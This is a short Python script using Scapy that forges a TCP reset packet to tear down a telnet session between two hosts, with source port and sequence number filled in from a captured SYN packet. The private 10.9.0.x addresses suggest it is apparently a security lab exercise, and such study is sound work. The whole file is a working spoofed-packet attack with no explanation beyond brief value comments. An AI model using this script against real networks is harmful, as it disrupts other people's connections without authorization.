#!/usr/bin/env python3
from scapy.all import *

# Replace values based on captured data
src_ip = "10.9.0.5"    # hostA's IP
dst_ip = "10.9.0.6"    # hostB's IP
sport = 60138          # hostA's source port from SYN packet
dport = 23             # hostB's telnet port
seq_num = 2516696361    #(from SYN packet)

ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq_num)
pkt = ip/tcp
send(pkt, verbose=0)
